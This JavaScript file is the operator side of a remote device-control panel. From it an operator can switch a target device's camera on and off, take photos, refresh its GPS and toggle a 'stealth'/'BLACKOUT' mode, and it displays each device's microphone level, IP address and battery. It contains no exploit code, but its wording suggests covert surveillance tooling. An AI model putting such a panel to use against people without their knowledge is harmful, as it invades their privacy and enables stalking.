/**
 * CommandDeck - Handles Multi-Device Selection, Remote Actions, Telemetry, and Photo Gallery
 */
import { AdminLogger } from './logger.js';
import { Toast } from '../common/toast.js';
import { MapTracker } from './map.js';

export class CommandDeck {
  constructor(socket) {
    this.socket = socket;
    this.devices = [];
    this.selectedDeviceId = null;
    this.onDeviceSwitch = null;
    this.snapshots = [];
    this.stealthActive = false;
  }

  init() {
    // 0. Toggle Camera (from Deck controls or Video panel)
    document.getElementById('cmd-toggle-cam')?.addEventListener('click', () => {
      this.toggleNodeCamera();
    });

    document.getElementById('btn-toggle-cam')?.addEventListener('click', () => {
      this.toggleNodeCamera();
    });

    // 1. Flip Camera
    document.getElementById('cmd-switch-cam')?.addEventListener('click', () => {
      this.sendCommand('switch_camera');
    });

    // 2. Play Alert Sound
    document.getElementById('cmd-trigger-alarm')?.addEventListener('click', () => {
      this.sendCommand('trigger_alarm');
    });

    // 3. Refresh GPS
    document.getElementById('cmd-force-gps')?.addEventListener('click', () => {
      this.sendCommand('refresh_gps');
    });

    // 4. Take Photo
    document.getElementById('cmd-force-snapshot')?.addEventListener('click', () => {
      this.sendCommand('take_snapshot');
    });

    // 5. Stealth Mode
    document.getElementById('cmd-stealth-mode')?.addEventListener('click', () => {
      this.stealthActive = !this.stealthActive;
      this.sendCommand('stealth_mode', { enabled: this.stealthActive });
      
      const sub = document.getElementById('cmd-stealth-sub');
      if (sub) {
        sub.textContent = this.stealthActive ? '[ DISABLE BLACKOUT ]' : '[ BLACKOUT ]';
        sub.style.color = this.stealthActive ? 'var(--color-warn)' : 'var(--text-dim)';
      }
    });

    // Take Photo button under video viewport
    document.getElementById('btn-take-snapshot')?.addEventListener('click', () => {
      this.sendCommand('take_snapshot');
    });

    // Fullscreen video
    document.getElementById('btn-fullscreen-feed')?.addEventListener('click', () => {
      const viewport = document.getElementById('admin-video-viewport');
      if (!document.fullscreenElement) {
        viewport?.requestFullscreen().catch(err => console.error(err));
      } else {
        document.exitFullscreen();
      }
    });

    // Clear Gallery
    document.getElementById('btn-clear-gallery')?.addEventListener('click', () => {
      const container = document.getElementById('gallery-container');
      if (container) container.innerHTML = '';
      const section = document.getElementById('gallery-section');
      if (section) section.style.display = 'none';
      this.snapshots = [];
      const countEl = document.getElementById('gallery-count');
      if (countEl) countEl.textContent = '0';
    });

    // Multi-Device Dropdown Change
    const selectEl = document.getElementById('device-select-dropdown');
    selectEl?.addEventListener('change', (e) => {
      const newDeviceId = e.target.value;
      this.selectDevice(newDeviceId);
    });
  }

  setDeviceList(devices) {
    this.devices = devices || [];
    const selectEl = document.getElementById('device-select-dropdown');
    const statusDot = document.getElementById('target-status-dot');
    const statusText = document.getElementById('target-status-text');

    if (!selectEl) return;

    selectEl.innerHTML = '';

    if (this.devices.length === 0) {
      this.selectedDeviceId = null;
      const opt = document.createElement('option');
      opt.value = '';
      opt.textContent = 'NO DEVICE';
      selectEl.appendChild(opt);

      if (statusDot) statusDot.className = 'status-dot status-dot-waiting';
      if (statusText) statusText.textContent = 'WAITING FOR DEVICE...';
      const targetDev = document.getElementById('metric-target-device');
      if (targetDev) targetDev.textContent = 'NO DEVICE CONNECTED';
      this.resetTelemetryDisplay();
      return;
    }

    if (statusDot) statusDot.className = 'status-dot';
    if (statusText) {
      statusText.textContent = `${this.devices.length} DEVICE${this.devices.length === 1 ? '' : 'S'} ONLINE`;
    }

    // Populate dropdown options
    this.devices.forEach((dev, idx) => {
      const opt = document.createElement('option');
      opt.value = dev.id;
      const indexStr = String(idx + 1).padStart(2, '0');
      opt.textContent = `[${indexStr}] ${dev.name} (${dev.id})`;
      selectEl.appendChild(opt);
    });

    // Verify if currently selected device still exists
    const stillExists = this.devices.some(d => d.id === this.selectedDeviceId);
    if (!stillExists) {
      this.selectDevice(this.devices[0].id);
    } else {
      selectEl.value = this.selectedDeviceId;
      const activeDev = this.devices.find(d => d.id === this.selectedDeviceId);
      if (activeDev && activeDev.telemetry) {
        this.applyTelemetry(activeDev.telemetry, activeDev.name);
      }
    }
  }

  selectDevice(deviceId) {
    if (!deviceId) return;
    this.selectedDeviceId = deviceId;

    const selectEl = document.getElementById('device-select-dropdown');
    if (selectEl) selectEl.value = deviceId;

    const dev = this.devices.find(d => d.id === deviceId);
    if (dev) {
      AdminLogger.log(`Switched active view to device: [${dev.name} - ${dev.id}]`, 'info');
      Toast.show(`Viewing: ${dev.name}`, 'info', 'admin-toast-container');
      if (dev.telemetry) {
        this.applyTelemetry(dev.telemetry, dev.name);
      }
    }

    if (this.onDeviceSwitch) {
      this.onDeviceSwitch(deviceId);
    }
  }

  toggleNodeCamera() {
    if (!this.selectedDeviceId) {
      Toast.show('No target device selected', 'warn', 'admin-toast-container');
      return;
    }
    const dev = this.devices.find(d => d.id === this.selectedDeviceId);
    const isCamActive = !!(dev?.telemetry?.camera?.active);
    const targetState = !isCamActive;

    this.sendCommand('set_camera', { enabled: targetState });
    AdminLogger.log(`Requested camera ${targetState ? 'ENABLE' : 'DISABLE'} for [${this.selectedDeviceId}]`, 'info');
  }

  sendCommand(command, payload = {}) {
    if (this.socket && this.socket.isOpen()) {
      this.socket.send({
        type: 'admin_command',
        command,
        payload,
        targetClientId: this.selectedDeviceId
      });
      AdminLogger.log(`Command sent: [${command.toUpperCase()}] to [${this.selectedDeviceId || 'ALL'}]`, 'info');
      Toast.show(`Sent: ${command}`, 'info', 'admin-toast-container');
    } else {
      Toast.show('Server not connected', 'error', 'admin-toast-container');
    }
  }

  applyTelemetry(telemetry, deviceName = null) {
    if (!telemetry) return;

    // 1. System & Device Telemetry
    if (telemetry.system) {
      const targetDev = document.getElementById('metric-target-device');
      if (targetDev) targetDev.textContent = deviceName || 'Connected Device';
      const valUa = document.getElementById('admin-val-ua');
      if (valUa) valUa.textContent = telemetry.system.userAgent || 'Unknown';
      const targetBat = document.getElementById('metric-target-battery');
      if (targetBat) targetBat.textContent = telemetry.system.battery || '--%';
      const valBat = document.getElementById('admin-val-battery');
      if (valBat) valBat.textContent = telemetry.system.battery || 'Unknown';
    }

    // 2. Camera Telemetry
    if (telemetry.camera) {
      const badgeVideo = document.getElementById('badge-remote-video');
      const metricCam = document.getElementById('metric-camera-status');
      const btnSnap = document.getElementById('btn-take-snapshot');
      const btnFs = document.getElementById('btn-fullscreen-feed');
      const btnRec = document.getElementById('btn-record-clip');
      const btnToggleCamText = document.getElementById('btn-toggle-cam-text');
      const cmdToggleCamTitle = document.getElementById('cmd-toggle-cam-title');
      const cmdToggleCamSub = document.getElementById('cmd-toggle-cam-sub');
      const videoEl = document.getElementById('remote-video-el');
      const placeholder = document.getElementById('remote-video-placeholder');
      const placeholderText = document.getElementById('placeholder-ascii-text');
      const overlay = document.getElementById('remote-video-overlay');

      const isCamActive = !!telemetry.camera.active;

      if (btnToggleCamText) {
        btnToggleCamText.textContent = isCamActive ? 'TURN CAM OFF' : 'TURN CAM ON';
      }
      if (cmdToggleCamTitle) {
        cmdToggleCamTitle.textContent = isCamActive ? '> TURN CAM OFF' : '> TURN CAM ON';
      }
      if (cmdToggleCamSub) {
        cmdToggleCamSub.textContent = isCamActive ? '[ FEED: LIVE ]' : '[ FEED: OFF ]';
      }

      const cmdToggleBtn = document.getElementById('cmd-toggle-cam');
      if (cmdToggleBtn) {
        cmdToggleBtn.classList.toggle('active-cam-command', isCamActive);
      }

      if (isCamActive) {
        if (badgeVideo) {
          badgeVideo.textContent = '[LIVE]';
          badgeVideo.className = 'badge badge-active';
        }
        if (metricCam) metricCam.textContent = telemetry.camera.facingMode === 'user' ? 'FRONT CAM' : 'REAR CAM';
        if (btnSnap) btnSnap.disabled = false;
        if (btnFs) btnFs.disabled = false;
        if (btnRec) btnRec.disabled = false;
        const camRes = document.getElementById('remote-cam-res');
        if (camRes) camRes.textContent = telemetry.camera.resolution || '1280 x 960';

        if (videoEl && videoEl.srcObject) {
          videoEl.style.display = 'block';
          if (placeholder) placeholder.style.display = 'none';
          if (overlay) overlay.style.display = 'flex';
        }
      } else {
        if (badgeVideo) {
          badgeVideo.textContent = '[OFFLINE]';
          badgeVideo.className = 'badge badge-idle';
        }
        if (metricCam) metricCam.textContent = 'INACTIVE';
        if (btnSnap) btnSnap.disabled = true;
        if (btnFs) btnFs.disabled = true;
        if (btnRec) btnRec.disabled = true;

        if (videoEl) videoEl.style.display = 'none';
        if (overlay) overlay.style.display = 'none';
        if (placeholder) {
          placeholder.style.display = 'flex';
          if (placeholderText) {
            placeholderText.textContent = 
`┌───────────────────────────┐
│                           │
│     [ CAMERA IS OFF ]     │
│   Turn on camera to view  │
│                           │
└───────────────────────────┘`;
          }
        }
      }
    }

    // 3. Microphone & Audio Telemetry
    if (telemetry.microphone) {
      const badgeAudio = document.getElementById('badge-remote-audio');
      const metricMic = document.getElementById('metric-mic-status');
      const vuFill = document.getElementById('admin-vu-fill');
      const statVol = document.getElementById('admin-stat-volume');

      if (telemetry.microphone.active) {
        if (badgeAudio) {
          badgeAudio.textContent = '[LIVE]';
          badgeAudio.className = 'badge badge-active';
        }
        if (metricMic) metricMic.textContent = `${telemetry.microphone.volumeLevel || 0}% VOL`;
        if (vuFill) vuFill.style.width = `${telemetry.microphone.volumeLevel || 0}%`;
        if (statVol) statVol.textContent = `${telemetry.microphone.volumeLevel || 0}%`;
      } else {
        if (badgeAudio) {
          badgeAudio.textContent = '[OFFLINE]';
          badgeAudio.className = 'badge badge-idle';
        }
        if (metricMic) metricMic.textContent = 'INACTIVE';
        if (vuFill) vuFill.style.width = '0%';
        if (statVol) statVol.textContent = '0%';
      }
    }

    // 4. Geolocation Telemetry
    if (telemetry.location && telemetry.location.active) {
      MapTracker.updatePosition(telemetry.location);
    }

    // 5. Network / Remote IP Telemetry
    if (telemetry.network) {
      const country = telemetry.network.country ? ` [${telemetry.network.country}]` : '';
      const ipText = `${telemetry.network.ip || 'Local'}${country}`;
      const valIp = document.getElementById('admin-val-ip');
      if (valIp) valIp.textContent = ipText;
      const metricIp = document.getElementById('metric-target-ip');
      if (metricIp) metricIp.textContent = ipText;
    }
  }

  resetTelemetryDisplay() {
    const badgeVideo = document.getElementById('badge-remote-video');
    const badgeAudio = document.getElementById('badge-remote-audio');
    const badgeGps = document.getElementById('badge-remote-gps');
    const metricCam = document.getElementById('metric-camera-status');
    const metricMic = document.getElementById('metric-mic-status');
    const metricGps = document.getElementById('metric-gps-status');
    const vuFill = document.getElementById('admin-vu-fill');
    const statVol = document.getElementById('admin-stat-volume');
    const valIp = document.getElementById('admin-val-ip');
    const metricIp = document.getElementById('metric-target-ip');

    if (badgeVideo) { badgeVideo.textContent = '[OFFLINE]'; badgeVideo.className = 'badge badge-idle'; }
    if (badgeAudio) { badgeAudio.textContent = '[OFFLINE]'; badgeAudio.className = 'badge badge-idle'; }
    if (badgeGps) { badgeGps.textContent = '[NO FIX]'; badgeGps.className = 'badge badge-idle'; }
    if (metricCam) metricCam.textContent = 'INACTIVE';
    if (metricMic) metricMic.textContent = 'INACTIVE';
    if (metricGps) metricGps.textContent = 'NO FIX';
    if (vuFill) vuFill.style.width = '0%';
    if (statVol) statVol.textContent = '0%';
    if (valIp) valIp.textContent = '--';
    if (metricIp) metricIp.textContent = '--';
  }

  addSnapshotToGallery(dataUrl, timestamp, clientId = null) {
    const section = document.getElementById('gallery-section');
    const container = document.getElementById('gallery-container');
    const countEl = document.getElementById('gallery-count');
    if (!section || !container) return;

    section.style.display = 'flex';
    this.snapshots.push({ dataUrl, timestamp, clientId });
    if (countEl) countEl.textContent = this.snapshots.length;

    const timeStr = timestamp ? new Date(timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();

    const item = document.createElement('div');
    item.className = 'snapshot-item';
    item.innerHTML = `
      <img src="${dataUrl}" alt="Captured Photo">
      <div class="snapshot-overlay">
        <span class="snapshot-time">${timeStr}</span>
        <button class="btn-download-snap" title="Download">Save</button>
      </div>
    `;

    item.querySelector('.btn-download-snap')?.addEventListener('click', (e) => {
      e.stopPropagation();
      const a = document.createElement('a');
      a.href = dataUrl;
      a.download = `photo-${Date.now()}.png`;
      a.click();
    });

    container.prepend(item);
    AdminLogger.log(`Photo received at [${timeStr}]`, 'success');
    Toast.show('New photo received from device', 'success', 'admin-toast-container');
  }
}
